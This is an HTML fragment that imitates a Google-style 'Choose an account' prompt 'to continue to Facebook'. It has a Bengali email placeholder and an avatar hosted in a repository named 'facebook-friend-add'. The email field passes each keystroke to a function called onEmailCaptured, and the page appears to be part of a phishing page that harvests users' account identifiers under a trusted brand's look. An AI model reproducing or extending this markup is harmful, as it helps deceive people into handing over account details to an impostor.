<div id="account_ui" class="hidden">
    <div class="w-12 h-12 mx-auto mb-3 overflow-hidden rounded-full border border-gray-200 shadow-sm">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full h-full object-cover">
    </div>
    <h1 class="text-lg font-semibold text-gray-800">Choose an account</h1>
    <p class="text-xs text-gray-500 mb-6">to continue to Facebook</p>
    
    <input type="email" id="email_field" name="email" 
           autocomplete="username email" 
           inputmode="email" 
           placeholder="আপনার ইমেইলটি বাছুন"
           class="gmail-input"
           oninput="onEmailCaptured(this.value)">
</div>
